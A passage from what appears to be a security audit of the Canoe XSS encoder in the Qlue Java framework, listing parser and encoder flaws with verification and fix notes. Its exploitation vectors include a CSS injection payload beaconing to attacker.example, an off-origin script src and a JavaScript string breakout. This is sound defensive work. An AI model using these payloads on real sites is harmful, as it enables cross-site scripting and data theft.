`asfunction:`/`data:`/`javascript:`/`livescript:`/`mocha:`, it stays `ATTR_HTML`. Colons are the
basic syntax of CSS declarations, so this silently converts `style` from "suppress" to
"HTML-encode".

**Exploitation vector.** A wholly ordinary template:

```html
<div style="color:$userColor">…</div>
```

Trace: `style` → `ATTR_CSS`; `"` → `TAG_ATTR_VALUE`; `c,o,l,o,r` buffered (`bufLen=5`); `:` →
`detectAttributePrefix()` → `attributeContext = ATTR_HTML`, `buf[0]=='c'` matches no prefix branch,
`bufLen = -1`. `$userColor` is inserted with `currentContext() == CTX_HTML_ATTR` → `html()`.

Attacker sets `userColor` to:

```
red;position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999;background:url(//attacker.example/beacon)
```

`html()` emits `red&#59;position&#58;fixed&#59;…`; the parser decodes every `;` `:` `(` `)` `/`
before the CSS parser runs. `"` → `&quot;` and `'` → `&#39;` also decode to real quotes *inside* the
value without terminating the attribute, so the attacker has unrestricted CSS: full-viewport
clickjacking overlay, CSS-selector exfiltration of CSRF tokens and other DOM content via
`background:url()`, UI redress, resource loading to an attacker origin — and `expression()` on
legacy engines.

**Precondition.** The colon must fall at value index ≤ 10. `color:`(5), `width:`(5), `margin:`(6),
`padding:`(7), `display:`(7), `position:`(8), `font-size:`(9) and `background:`(10) all trigger it;
`text-decoration:`(15) does not, because the `bufLen == 10` cutoff at line 924 stops the scan first.
`<div style="$c">` with no preceding colon is correctly suppressed. The trigger is common but not
universal.

The same reset also downgrades `ATTR_URI` → `ATTR_HTML` in `<a href="https://cdn.example.com/$path">`
(the `:` in `https:` fires it), replacing percent-encoding with entity-encoding and enabling URL
path and query manipulation. And it is half of F5.

It downgrades `ATTR_JS` too, which is worse than either and is recorded separately as
[F17](#f17--high-the-detectattributeprefix-reset-also-defeats-the-javascript-suppression).

This is a complete defeat of the "refuse to output into CSS contexts" guarantee that the original
design documents call Canoe's centrepiece.

> **Verified**, with one correction applied. The adversarial pass placed the cutoff one character
> earlier and concluded `background:` was safe. Re-reading `Canoe.java:912-937` settles it: the
> `c == ':'` test is evaluated **before** the `bufLen == 10` cutoff, so a colon at index 10 does
> still trigger `detectAttributePrefix()`, and `background:` is affected.
>
> **Re-verified end to end 2026-07-26 (T17).** `CssContextTest.thePropertyNameDecidesWhetherStyleIs`
> `Suppressed` runs every property name in the precondition paragraph above as a row, and asserts
> three things together per row: that the colon lands on the index this finding claims, that Canoe
> reaches the context that implies, and that the CSS parser is handed what that context produces. The
> point of asserting them together is that F4's precondition is *an integer*, not a property name —
> `padding:` and `display:` have to agree because both put the colon at 7, and `background:` and
> `font-family:` have to differ because they are 10 and 11. Two further things the finding states
> only in prose are now tests: `theResetDowngradesEveryClassificationAndNotOnlyTheCssOne` shows the
> same line of code moving `ATTR_CSS`, `ATTR_URI` *and* `ATTR_JS` to `ATTR_HTML` (the third is F17),
> and `aQuotedCssStringIsNotAContainer` shows that a CSS string literal around the reference is worth
> nothing — `content:'$x'` is injectable and `font-family:'$x'` is not, and the only difference is
> four characters of property name. `aColonInsideAStyleElementBodyDoesNothingAtAll` pins the
> complementary fact: the CSS states never call `detectAttributePrefix()`, so the identical
> declaration is suppressed in a `<style>` body and injectable in a `style` attribute.

---

### F5 — High: `javascript:` prefix detection reads uninitialised buffer residue

**Location:** `Canoe.java:246-255` (the check) and `Canoe.java:933` (the missing terminator).

`detectAttributePrefix()` checks `buf[10] == '\0'` to confirm the value prefix was exactly
`javascript`. But the `TAG_ATTR_VALUE` path **never writes a NUL terminator** — compare
`TAG_ATTR_NAME`, which does `buf[bufLen++] = '\0'` at line 809, with `TAG_ATTR_VALUE` at line 933,
which does not. `buf` is a 36-char field, shared across the whole render and never cleared; only
`bufLen` is reset. The value scan can only ever write indices 0–9 (at `bufLen == 10` it bails
without writing), so a value can never repair `buf[10]` itself.

Whether `javascript:` is detected therefore depends on what an *earlier, unrelated* tag or attribute
name left at index 10. A fresh `Canoe` has a zero-filled `buf`, so it works on simple pages — which
is precisely why this survives casual testing.

**Exploitation vector:**

```html
<input placeholder="Search">
…
<a href="javascript:showDetails('$id')">details</a>
```

`placeholder` is 11 characters, so it writes `buf[0..10]`, leaving `buf[10] == 'r'` and its
terminator at `buf[11]`. When the `javascript:` value prefix is later checked, `buf[10] != '\0'` →
no match — and because of F4 the context has *already* been reset to `ATTR_HTML`. `$id` is
html-encoded, the parser decodes it, and `');alert(1);//` breaks out of the JS string literal inside
a `javascript:` URL. With a clean buffer the identical template yields `ATTR_JS` → `CTX_JS` → empty
string.

Any earlier name of ≥ 11 characters arms it: `placeholder`, `autocomplete`, `crossorigin`,
`cellpadding`, `frameborder`, `contenteditable`, `formnovalidate`, `data-toggle`,
`onreadystatechange`. A name of *exactly* 10 characters **repairs** it, because its terminator lands
on `buf[10]` — so an `xlink:href` (10 chars) elsewhere on the page silently makes the page safe
again. Reorder two elements and the security of the page changes. This kind of order-dependent
action at a distance is very hard to test for and very hard to review.

The same residue problem affects the `asfunction` and `livescript` checks (both read `buf[10]`), and
`data`/`mocha` at the shorter indices `buf[4]`/`buf[5]`.

> **Verified.** Full trace confirms `attributeContext == ATTR_HTML` at insertion, versus `ATTR_JS`
> with a clean buffer.
>
> **Verified as a property, 2026-07-26 (T22).** `BufferResidueTest` fixes the target
> `<a href="javascript:f('$data')">` and varies only the markup above it, over benign elements whose
> single attribute name runs from 1 to 20 characters. Twenty renders of the same reference into the
> same sink produce **exactly two** distinct outputs, split between 10 and 11: names of 1–10
> characters leave the render byte-identical to one with no value at all, and names of 11–20 leave it
> byte-identical to one where the payload was `html()`-encoded into the URL, where the parser's single
> decode hands the JavaScript parser a closed string literal. Each row also asserts the byte at
> `buf[10]` — `'\0'` or `'q'` — so the evidence is the cause and not the symptom.
>
> Three things the finding states in prose are now assertions. The **repair** is real and directional:
> an 11-character name followed by a 10-character one is safe, followed by a 9-character one is not,
> and swapping the two elements changes the answer. The residue **crosses `write()` boundaries** —
> the same characters fed as one call, two calls and 39 calls reach the same `buf[10]`, which matters
> because Velocity never writes a template in one call. And the **shorter indices are worse**: per
> T10's rule that a name of length L writes its terminator at `buf[L]`, a prefix check reading index
> N passes exactly when `L <= N`, so `data:` (N=4) is defeated by `title` and `mocha:` (N=5) by
> `background` — no preceding element required at all.

---

### F6 — High: `HtmlEncoder.url()` is a scheme filter, not an origin filter

**Location:** `HtmlEncoder.java:180-231`.

```java
Matcher m = uriPattern.matcher(input);          // ^(https?://)([^/]+)(/.*)?$
if (m.matches()) {
    sb.append(m.group(1));                      // scheme emitted verbatim
    HtmlEncoder.url(m.group(2), sb);
    HtmlEncoder.url(m.group(3), sb);
} else {
    HtmlEncoder.url(input, sb);
}
```

The private worker's allowlist is `a-z A-Z 0-9 / . - # ? =`.

`url()` correctly neutralises `javascript:alert(1)` (the `:` becomes `%3A`, leaving a relative path),
and likewise `data:`, `vbscript:`, backslash variants, and even `HTTP://` — the regex is
case-sensitive, so the colon gets escaped. But:

- **`//attacker.example/x.js` passes through byte-for-byte** — every character is in the allowlist.
- **`https://attacker.example/x.js` passes through** — the scheme is emitted literally and the host
  survives because `.` and `-` are allowed.

Canoe discards the tag name once it begins parsing attributes (`buf` is reused at `Canoe.java:786`),
so it cannot distinguish `<a href>` from `<script src>`. Both get the same encoder.

**Exploitation vector:**

```html
<script src="$cdnBase/app.js"></script>
```

`cdnBase` = `//attacker.example` → emitted unmodified → attacker-controlled JavaScript executes with
full page privileges. The same applies to `<iframe src="$u">`, `<img src="$u">` (referrer and state
exfiltration), and `<a href="$u">` (open redirect, phishing).

This was a *known* limitation. The demo template deleted at commit `6d4cfcc`
(`git show 6d4cfcc^:web/canoe-demo/WEB-INF/vm/index.vm`) says:

> **Important:** Inclusion of external context (e.g., via `<script src=...>`) is not currently
> covered. At this stage the focus is on preventing payload execution in the _same_ page.

That caveat never reached `README.md` or `qlue_user_guide.md`, both of which claim unqualified XSS
prevention.

> **Verified**, including that the `javascript:`/`data:`/`HTTP://` neutralisation genuinely works and
> that `m.group(3)` being null is safely null-guarded at `HtmlEncoder.java:207`.
>
> **Re-verified end to end 2026-07-26 (T16), and one thing this finding does not say is now said.**
> `UrlSinkTest.anOffOriginCdnBaseSurvivesIntoAScriptSrcByteForByte` is the exploitation vector above
> as a running test, in both directions — the protocol-relative and absolute forms arrive at the
> `src` attribute unmodified, and the `javascript:` form really is neutralised, which is asserted so
> that the finding is not read as "`url()` does nothing".
> `everyElementGetsTheSameEncoderForTheSameAttributeName` pins the tag-name blindness as an
> *equality* across `<a>`, `<img>`, `<script>`, `<iframe>`, `<embed>`, `<link>` and `<base>`: the
> claim is not that each is percent-encoded but that Canoe cannot tell them apart, and only a
> comparison says the second thing. That test is what remediation item 5 has to break.
>
> **The scope this finding leaves open is the substitution position, and it bounds F6 sharply.**
> `theFourSubstitutionPositions` measures all four: full-URL (`href="$data"`) and path-prefix
> (`src="$data/app.js"`) reach the URL's **authority** and are the vector; path-suffix
> (`href="/p/$data"`), query (`href="/search?q=$data"`) and fragment (`href="/page#$data"`) do not,
> and are safe. `url()` emits byte-identical output in all five — measured, in
> `theQueryPositionIsSafeBecauseOfTheTemplateAndNotBecauseOfTheEncoder` — so what makes the last three
> safe is the template's own literal text, not the encoder. The practical consequence for the triage
> guidance below: the grep for `="$` returns all five shapes, and only the two that let the reference
> begin the authority are F6.

---

### F7 — Medium: the `content` attribute branch tests for `data`

**Location:** `Canoe.java:294-308`, carrying the author's own marker.

```java
// XXX The following two cases are the same, which one is correct?

// content
if ((buf[0]=='d') && (buf[1]=='a') && (buf[2]=='t') && (buf[3]=='a') && (buf[4]=='\0')) {
    attributeContext = ATTR_CONTENT;
    return;
}

// data
if ((buf[0]=='d') && (buf[1]=='a') && (buf[2]=='t') && (buf[3]=='a') && (buf[4]=='\0')) {
    attributeContext = ATTR_URI;   // unreachable
    return;
}
```

Two consequences. `data=` always resolves to `ATTR_CONTENT` → `CTX_SUPPRESS`, so
`<object data="$u">` silently drops the value — fail-safe, but a functional bug developers will
route around. And there is **no check for `content` at all**, which is the `content` row of F3.

---

### F8 — Medium: no tests, no documentation, no published threat model

There has never been a single test for `Canoe`, `CanoeReferenceInsertionHandler`, or `HtmlEncoder`
in this repository's entire git history. The whole test tree is
`src/test/java/com/webkreator/qlue/router/TestRouting.java` (routing only). F1, F7 and F9 are each
one unit test away from being obvious.

The documentation states an unqualified guarantee — "automatic context-sensitive output encoding to
prevent XSS" (`README.md:11`), "Built-in XSS defence" (`qlue_user_guide.md:22`) — while the only
honest statement of scope was in the demo deleted at `6d4cfcc`. Neither `$_x`,
`allowDirectOutput()`, the JS/CSS suppression behaviour, nor the external-content limitation is
documented anywhere a user of the framework would find it. A developer reading the README will write
`<div style="color:$c">` and `<form onsubmit="v('$id')">` believing they are protected.

Build notes for whoever adds the tests:

- `gradle/dependency-locks/` with `lockAllConfigurations()` is in force, so a new test dependency
  requires `./gradlew dependencies --write-locks`.
- `src/test/resources` is not a declared source set — a `.vm` fixture must live under `src/test/java`
  (as `direct.vmx` does), or the source set must be extended.
- JUnit 4.13.2, Mockito 5.11.0 and Velocity 2.4.1 are already on the test classpath.

---

### F9 — Low (latent): `write(char[], int, int)` confuses length with end index

**Location:** `Canoe.java:169-187`.

```java
for (i = offset; i < len; i++) {          // should be: i < offset + len
    processChar(cbuff[i]);
}
…
writer.write(cbuff, offset, len);         // correct 3-arg semantics
} catch (IOException e) {
    writer.write(cbuff, offset, len - (len - i));   // == writer.write(cbuff, offset, i)
```

- `offset == 0` → `i < len` is accidentally correct.
- `offset == 3, len == 12` → the first 9 of 12 characters parsed, all 12 written. **Three characters
  reach the response without entering the state machine.**
- `offset >= len` → **zero characters parsed, all written.** The state machine freezes and every
  subsequent reference is encoded for a stale context.

In general the parser sees only the first `len - offset` characters of the range, so the number of
characters that escape it is exactly the offset.

The error path is wrong the same way: `len - (len - i)` simplifies to `i`, an absolute index passed
as a length. At `offset == 0` that is accidentally right; at `offset == 1` the partial output
includes the very character that was rejected.

**A consequence not noted in the first pass: the bug can suppress an encoding error outright.**
Because the tail of the range is never parsed, markup Canoe would have rejected can fall past the
loop bound and reach the response intact. Measured, with `document = "<p>ok</p><br/>"`:

| Offset | Parsed | Outcome |
|---|---|---|
| 0 | all 14 | error raised, partial output `<p>ok</p><br` |
| 1 | first 13 | error raised, partial output `<p>ok</p><br/` — one character too many |
| 2 | first 12 | **no error at all**; the full malformed `<p>ok</p><br/>` is written |

So F9 does not merely desynchronise the parser, it can disable the validation as well.

**Reachability: not currently exploitable.** Verification unpacked
`velocity-engine-core-2.4.1-sources.jar` and read the JDK `java.io.Writer` source. Every inherited
default — `write(int)`, `write(char[])`, `write(String)`, `write(String,int,int)`,
`append(CharSequence)` — funnels to `write(cbuf, 0, n)`. The engine's render path (`ASTText`,
`ASTReference`, `ASTBlock`, `ASTTextblock`, `ASTEscape`, `Include`, `RuntimeMacro`) uses only the
one-argument `write(String)`/`write(char[])` forms; the only three-argument call sites live in
`org.apache.velocity.io.VelocityWriter`, which the engine never instantiates. `Template.merge()`
passes the caller's writer through unwrapped.

Still worth fixing. `Canoe` is a public `Writer` with no documented restriction and
`VelocityViewFactory.render(page, view, writer)` is public; a Velocity upgrade, an
`org.apache.velocity.io.Filter` implementation, or any buffering wrapper re-arms it silently. A
parser whose safety depends on nobody ever calling a standard `Writer` method with a non-zero offset
is one refactor from failing open.

> **Measured, 2026-07-26 (T21).** `ChunkInvarianceTest` states the property F9 breaks — that where
> the writer cuts the template into `write()` calls must not change the result — and finds **no
> counterexample at all** through `write(String)`, over every one of the 9,996 two-way splits of the
> corpus's 275 templates plus a seeded multi-way sample. Feed the *identical* pieces as slices of one
> array instead, through `write(char[], offset, length)`, and a single mid-point split desynchronises
> **243 of the 275**. That is the size of the gap between the entry point Velocity uses and the one
> next to it in the same class. When F9 is fixed the count goes to zero and the test says so.

---

### F10 — Low (latent): `SCRIPT_END` accepts `</scriptfoo>` as a script terminator

**Location:** `Canoe.java:947-958` (and `Canoe.java:967-978` for `CSS_END`).

`SCRIPT_END` matches the seven characters `/script` and immediately sets `state = TAG;
nextState = HTML;` with no check that the next character is whitespace, `/`, or `>`. Per the HTML
Standard's script-data-end-tag-name state, `</scriptfoo>` does **not** close a script element — the
browser stays in script data state while Canoe believes it is back in HTML. `CSS_END` has the
identical defect with `/style`.

The converse desync also exists: `<script>x = 1 <</script>` leaves Canoe stuck in `SCRIPT`, because
`SCRIPT_END` mismatches on the second `<` and returns to `SCRIPT` *without* re-processing that
character, suppressing the rest of the page.

**Attacker reachability: refuted.** References evaluated inside `SCRIPT`/`SCRIPT_END` encode to the
empty string, and none of `html()`, `htmlWhite()` or `url()` can emit a raw `<` (it becomes `&lt;` or
`%3C`), so attacker data can never create the `<` that enters `SCRIPT_END`. Only template literal
text can. Even given a desync, `htmlWhite()` output inside script *text* is not entity-decoded by the
browser, so `&#39;` stays literal — syntax errors, not a string breakout.

Recorded as latent rather than dismissed: it means the state machine is not a faithful model of the
HTML tokenizer, and any future decision to actually *encode* rather than suppress in JS contexts
turns this into a direct exploit. See
[Corollary: attacker data can never steer the parser](#corollary-attacker-data-can-never-steer-the-parser)
for the property this depends on.

**The refutation above is narrower than it reads, and the gap is worth writing down.** It reasons
about `htmlWhite()`, which is what a reference in *text* position after a forward desync gets. But
after `</scriptfoo>` Canoe believes it is back in HTML, so a URL-bearing attribute in the template
puts **`url()`** output into what the browser reads as script data — and `url()`'s allowlist
(`a-zA-Z0-9 / . - # ? =`) is strictly wider in the JavaScript-significant direction than
`htmlWhite()`'s, passing `=` and `/` through naked. `location=/x/` is twelve characters of live
JavaScript, every one of them allowlisted. It is still not exploitable, and for a *different* reason
from the one this finding gives: the template's own literal text after the desync — `<a href="` — is
itself a JavaScript syntax error, and a syntax error anywhere in a classic script block means the
whole block fails to parse and nothing in it runs. The attacker cannot repair it, because repairing
it requires a `<` or a quote and no encoder emits either. Both halves of that argument are now tests
(`ScriptAndStyleElementTest.afterAForwardDesyncAUrlAttributeIsEncodedWithUrlRatherThanHtmlWhite`), and
the second half is the one that would go first: it depends on the *template*, where the corollary
depends on the *encoders*.

> **Verified end to end 2026-07-26 (T18).** `ScriptAndStyleElementTest` asserts both desyncs as
> disagreements between two parsers rather than as facts about one — the same string goes through
> Canoe's state machine and through jsoup, and the test requires them to differ.
> `aScriptEndTagWithASuffixClosesTheScriptForCanoeAndNotForTheParser` shows Canoe in `CTX_HTML` while
> jsoup still has the following text inside the `<script>` element;
> `aStrayLessThanInsideAScriptSuppressesTheRestOfThePage` shows Canoe still in `CTX_JS` three elements
> later while jsoup has closed the script, and asserts the availability cost with an ordinary word as
> the payload rather than an attack, because losing the page's content is the actual impact.
> `bothDesyncsHaveExactCssTwins` measures the `CSS_END` pair rather than inferring it from the source
> being identical. `onlyTemplateTextCanCauseADesync` is the reachability argument, quantified: every
> payload in the catalogue, through all seven templates, must leave Canoe in the state the inert
> marker leaves it in and must contribute no `<`. `ParserSteeringTest` (T23) is the general form of
> that property over the whole corpus and is not written yet; until it is, that test is the only
> executable statement of the precondition in the `SCRIPT`/`CSS` states, which is where an encoder
> relaxation changes it.
>
> One thing that was checked and is *not* a defect: `SCRIPT_END` and `CSS_END` lowercase as they
> compare (`Canoe.java:948`, `Canoe.java:968`), so `</SCRIPT>` closes correctly. A case-sensitive
> comparison there would have been the converse desync reachable from ordinary well-formed markup
> rather than from a stray `<`, which would have been a finding of its own; it is pinned in
> `theFourStatesAScriptOrStyleBodyCanBeIn` with that reasoning attached.

> **Resolved — R17 (2026-07-26).** Both desyncs are closed and the finding is no longer live.
>
> - **Forward.** `SCRIPT_END`/`CSS_END` now hand the matched name to new `SCRIPT_END_NAME`/
>   `CSS_END_NAME` states, which leave the element only for the delimiters the standard's
>   script-data-end-tag-name and rawtext-end-tag-name states name — tab, LF, FF, CR, space, `/` or
>   `>` — and return to the element body for anything else. `closingTag`/`tagName` are assigned on
>   the confirmed path only, so `</scriptfoo` names no tag.
> - **Converse.** Both `*_END` and both `*_END_NAME` states set `charNeedsProcessing = true` on the
>   mismatch arm, so the `<` that opens the real end tag is re-processed rather than swallowed.
>
> **The "not a defect" note above was too generous, and R17's first cut inherited it.** The fold was
> `Character.toLowerCase()`, which is Unicode and not ASCII, and `Character.toLowerCase(U+0130 LATIN
> CAPITAL LETTER I WITH DOT ABOVE)` is `'i'`. So an end tag spelling `script` with U+0130 matched
> `/script`, closed the element for Canoe, and left every browser in script data — this finding's own
> forward desync, reached by a character the new delimiter check never sees. The tokenizer accepts
> only ASCII alpha into an end tag name, so the fold is now `asciiToLowerCase()`; a sweep of the BMP
> confirms U+0130 was the only code point whose fold lands anywhere in `/script` or `/style`. The
> *opening* tag still folds Unicode and is deliberately unchanged: there Canoe enters `SCRIPT` where
> the browser has an unknown element, which suppresses, and suppression is fail-closed.
>
> Test names moved with the inversions and the ones cited above no longer exist:
> `aScriptEndTagWithASuffixClosesTheScriptForCanoeAndNotForTheParser` is now
> `.aScriptEndTagWithASuffixClosesTheScriptForNeitherCanoeNorTheParser`,
> `aStrayLessThanInsideAScriptSuppressesTheRestOfThePage` is now `.aStrayLessThanInsideAScript`
> `NoLongerSuppressesTheRestOfThePage`,
> `afterAForwardDesyncAUrlAttributeIsEncodedWithUrlRatherThanHtmlWhite` is now
> `.afterASuffixedEndTagNoAttributeEncoderIsReachableAtAll`, and
> `theFourStatesAScriptOrStyleBodyCanBeIn` is now `.theSixStatesAScriptOrStyleBodyCanBeIn`.
> `bothDesyncsHaveExactCssTwins` and `onlyTemplateTextCanCauseADesync` keep their names;
> `CanoeStateMachineTest.theEndTagNameIsMatchedWithAnAsciiFoldAndNotAUnicodeOne` is new and owns the
> fold. The four corpus rows are re-verdicted against the sink: the two suffixed-end-tag rows are
> `SUPPRESSED_BY_DESIGN` (and their sink kinds moved to `JAVASCRIPT`/`CSS`, because that is what the
> position now is), the two converse rows are `SAFE`. `ParserSteeringTest` (T23) exists and passes,
> so the precondition this finding rested on is now quantified over the whole corpus rather than over
> one file.

---

### F11 — Low: unquoted attribute references silently render as the empty string

**Location:** `Canoe.java:1015-1057`.

`currentContext()` has no case for `TAG_ATTR_VALUE_BEFORE`, nor for `TAG_ATTR_NAME`,
`TAG_EMPTY_ENDING`, the `COMMENT_*`/`DOCTYPE_*` states, or `INVALID`; all fall to
`return CTX_SUPPRESS` at line 1056. In `<a href=$x>` the reference is inserted while the parser is
still in `TAG_ATTR_VALUE_BEFORE` — the quote that would advance it to `TAG_ATTR_VALUE` never
arrives — so `$x` always renders empty. `<a href= $x>` behaves the same.

Narrower than it first appears: `<a href=/p/$y>` *does* reach `TAG_ATTR_VALUE` (`QUOTE_NONE`, line
877) before `$y`, so it renders correctly. Only a reference immediately after `=` is dropped.

Fail-closed, so not a vulnerability in itself. It earns a place here because of where it pushes
developers: the value vanishes with no error and no diagnostic, and the documented remedy is
`allowDirectOutput()` + `$_x.asis()`, which disables Canoe for that value entirely. Every
silent-suppression bug in this class — see also F7's `data=` — converts into a manually encoded,
unreviewed output site.

> **Resolved in part — R19 (2026-07-26).** `currentContext()` now answers `TAG_ATTR_VALUE_BEFORE`
> with the same thing it answers `TAG_ATTR_VALUE`: the attribute's name-derived context. The state is
> entered only from `TAG_ATTR_NAME_AFTER` on `=`, which is only reachable from `TAG_ATTR_NAME`, which
> classifies the name before it leaves, so the answer is this attribute's own and never a leftover.
> `<a href=$x>` now renders byte-for-byte what `<a href="$x">` renders, minus the quotes, and the
> three classifications that suppress still suppress.
>
> The routing is safe because no encoder reachable from an attribute value can emit a character that
> ends an unquoted one. An unquoted value ends at whitespace or `>` — for Canoe and for the
> standard's attribute-value-unquoted state, which treats `"`, `'`, `<`, `=` and `` ` `` as a parse
> error that stays *inside* the value — and the first character decides the quoting. `htmlAttr()`
> is `html()`, which escapes every non-alphanumeric, so space is `&#32;` and `>` is `&gt;`; `url()`
> emits only the unreserved set, its per-component safe delimiters (none of which is a quote, a space
> or an angle bracket), `%XX` escapes and the structural `:`/`//`/`?`/`#` it writes itself; and
> `urlResource()` returns either `url()`'s output or nothing. That argument is not left as prose:
> `UnquotedAttributeValueTest.noEncoderReachableFromAnAttributeValueCanTerminateAnUnquotedOne` sweeps
> every payload in the catalogue through every context an attribute name can produce, and Chromium
> parses the result in the browser tier.
>
> **In part**, because F11's other holes are deliberate and stay. `TAG_ATTR_NAME`,
> `TAG_EMPTY_ENDING`, the `COMMENT_*`/`DOCTYPE_*` states and `INVALID` still fall to `CTX_SUPPRESS`:
> `TAG_ATTR_VALUE_BEFORE` had a name-derived answer waiting for it and none of the others has an
> encoder at all — a comment would need `-->` modelled, a tag-name position would need a name
> grammar. Those rows stay `SUPPRESSED_UNINTENDED` in the ledger.
>
> One residual, recorded rather than found later: an unquoted attribute whose value renders *empty*
> swallows the template's next attribute, because `<img src= alt="a">` is one attribute to every
> tokenizer including Canoe's. That is a property of HTML, it applies to a legitimately empty model
> value just as much, and F11 used to produce it *unconditionally* for every unquoted value — so
> R19 shrinks it to the suppressing classifications rather than introducing it. Emitting `""` instead
> would repair `<img src=$x alt="a">` and break `<a href=$base/p>`; the template-level answer is to
> quote the value. Pinned by
> `UnquotedAttributeValueTest.anEmptyUnquotedValueSwallowsTheNextAttribute`.
>
> The verified test is inverted to
> `CanoeStateMachineTest.unquotedValuesTakeTheirNameDerivedContextImmediatelyAfterTheEquals`, which
> keeps the former name and this reasoning in its javadoc.

---

### F12 — Low (unverified): references inside `#set` and interpolated strings use the wrong context

**Location:** `CanoeReferenceInsertionHandler.java:41-57`.

`referenceInsert()` queries `qlueWriter.currentContext()` — the state of the *main output stream at
that instant*. Velocity renders interpolated double-quoted string literals
(`#set($msg = "Hello $name")`) into an internal writer, but the event cartridge is attached to the
context, so the handler still fires and still consults the main stream's position.

`$name` would then be encoded for wherever the template happened to be when the `#set` ran, not for
wherever `$msg` is eventually printed. In HTML state that means double encoding (`<` → `&amp;lt;`,
rendered literally); inside a tag it means the value silently becomes empty. Not a bypass — the
second encoding pass at output time still applies — but another silent-corruption source that drives
developers to the `$_x` escape hatch.

> **Verified 2026-07-26.** It reproduces. `#set($msg = "Hello $data")<p>$msg</p>` with
> `data = "<b>"` renders `<p>Hello &amp;lt&#59;b&amp;gt&#59;</p>` — visibly double-encoded. The true
> scope is narrower than this finding assumed: only *interpolated string literals* trigger it. A
> plain `#set($u = $data)` followed by `<a title="$u">` single-encodes correctly, because a plain
> reference assignment does not fire `referenceInsert()`.
>
> **One consequence worth knowing before fixing it, 2026-07-26 (T19).** The double encoding
> *neutralises* the largest vulnerability class in this document. Route a value through an
> interpolated `#set` and then into an unrecognised event handler — F2's territory, `ATTR_HTML` and
> therefore `html()` — and the parser's single decode leaves the literal text `&#39;` instead of an
> apostrophe, so the string literal is never closed.
> `VelocityIntegrationTest.doubleEncodingAccidentallyNeutralisesAnUnrecognisedHandler` asserts both
> halves. This is not a reason to keep F12; it is a reason to fix F1/F2/F19 first, because fixing F12
> alone turns some templates from safe to injectable with no other change.
>
> The `${_x.` trap has a second spelling. `$!{_x.asis($data)}` does not bypass either, for the same
> reason — `CanoeReferenceInsertionHandler` matches the literal prefixes `$_x.` and `$!_x.`, and
> neither formal form starts with either. Both are pinned in
> `VelocityIntegrationTest.formalNotationSilentlyDefeatsTheBypassBecauseThePrefixIsMatchedLiterally`,
> which also asserts that the formal form's output is byte-identical to never having called the tool
> at all: the bypass is absent, not partially applied.

---

### F13 — Medium: the `[Encoding Error]` recovery branch is unreachable

*Added 2026-07-26, found while building the test suite.*

**Location:** `VelocityViewFactory.java:218-224`.

```java
} catch (Exception e) {
    String message = e.getMessage();
    if ((message != null) && (message.startsWith(Canoe.ERROR_PREFIX))) {
        writer.append("[Encoding Error]");
    } else {
        throw e;
    }
}
```

The test is `startsWith` on the **top-level** exception's message, but Velocity never leaves the
`IOException` at the top level. Measured against velocity-engine-core 2.4.1:

| Path | Top-level exception | Message | `startsWith("Encoding Error: ")` |
|---|---|---|---|
| `Template.merge()` — **the production path** | `VelocityException` | `IO Error rendering template 'probe.vm'` | no |
| `engine.evaluate()` | `VelocityException` | `IO Error in writer: Encoding Error: Invalid character after tag name (line: 1, pos: 13)` | no |

So the branch never runs. Every encoding error propagates out of `render()` as an unhandled
exception — a 500, not a degraded page — and the partial output already written to the response is
whatever Canoe flushed before it gave up, which for an error inside a tag ends mid-element.

This matters more than it looks, because the errors are easy to reach from ordinary templates. Five
inputs that a developer would consider unremarkable all raise one, and none is attacker-controlled —
they are template-authoring hazards, so they fail closed from a security standpoint but take the page
down:

| Input | Error |
|---|---|
| `<br/>` | `Invalid character after tag name`. A `/` immediately after a tag name is rejected. `<br />` and `<img src="a.png"/>` are both fine; only the no-space form fails. |
| `<p>5 < 6</p>` | `Tag name too short`. A literal `<` in body text kills the render. |
| `<data-widget-configuration-attribute-name>` | `Tag name too long`. `MAX_TAGNAME_LEN` is 36. |
| `</ p>`, `</>` | `Tag name too short`. |
| A C0 control character in body text | `Invalid character detected in output`. |

**Fix:** match on the cause chain rather than the top-level message, and prefer an explicit exception
type over string matching — have `Canoe.raiseError()` throw a `CanoeEncodingException extends
IOException` and catch that. Note that appending `[Encoding Error]` to a half-written response is
itself a poor recovery: the response already contains an unterminated element. Truncating to the last
known-good tag boundary, or failing the request outright, would both be more honest.

> **Verified.** Probed on both the `merge()` and `evaluate()` paths; output in the table above.
>
> *Correction, 2026-07-26.* This note originally said
> `CanoeTestSupport.RenderResult.productionWouldSwallow()` pinned the behaviour in the test suite. It
> overstated on two counts. First, that method re-implemented `startsWith(Canoe.ERROR_PREFIX)` over
> an exception the *harness* had produced — a copy of the check under test, not the check itself, so
> fixing `render()` would have left it answering exactly as before and the test green. Second,
> nothing in the test tree called `VelocityViewFactory.render()` at all: the whole suite went through
> `engine.evaluate()`, whose wrapper message is `"IO Error in writer: …"`, and never through
> `Template.merge()`, whose `"IO Error rendering template '…'"` is the string the branch is actually
> tested against in production. The copy has been deleted.
> `CanoeRobustnessTest.noErrorCanoeRaisesIsSwallowedInProduction` now drives every input in the
> rejection table through the real `render()` — via `ProductionRenderProbe`, which supplies a real
> `Page`, a real `QlueApplication`, a real `VelocityView` and a real `Template` — and asserts on what
> a caller observes: an exception escapes, and no `[Encoding Error]` reaches the response. Both flip
> when the fix lands.

---

### F14 — Low: a comment ending in three or more dashes never closes

*Added 2026-07-26, found while building the test suite.*

**Location:** `Canoe.java:666-672`.

```java
case COMMENT_CLOSE_2:
    if (c == '>') {
        state = HTML;
    } else {
        state = COMMENT;      // <-- a third '-' sends it back to COMMENT
    }
    break;
```

The HTML Standard's comment-end state stays in comment-end when it sees another `-`, and closes on
the following `>`. Canoe drops back to `COMMENT` instead, so it never sees the close:

| Input | Browser | Canoe |
|---|---|---|
| `<!--a-b-->` | comment closed | `HTML` — correct |
| `<!--a--->` | comment closed | stuck in `COMMENT` |
| `<!--a---->` | comment closed | stuck in `COMMENT` |

Once stuck, `currentContext()` returns `CTX_SUPPRESS` for the remainder of the render, so every
subsequent reference on the page silently becomes the empty string.

Fail-closed, so an availability defect rather than a vulnerability, and the same shape as F10's
converse: the state machine is not a faithful model of the HTML tokenizer. It is recorded because
three dashes at the end of a comment is a common enough typo — and because the failure is silent and
affects the *rest of the page*, not just the comment.

**Fix:** in `COMMENT_CLOSE_2`, stay in `COMMENT_CLOSE_2` on `-` rather than returning to `COMMENT`.

> **Verified.** `CanoeStateMachineTest.aCommentEndingInThreeDashesNeverCloses`.

---

### F15 — Low: `url()` silently corrupts legitimate URLs five different ways

*Added 2026-07-26, found while building the test suite.*

**Location:** `HtmlEncoder.java:206-231`.

The private worker allows `a-z A-Z 0-9 / . - # ? =` and percent-escapes everything else, with a
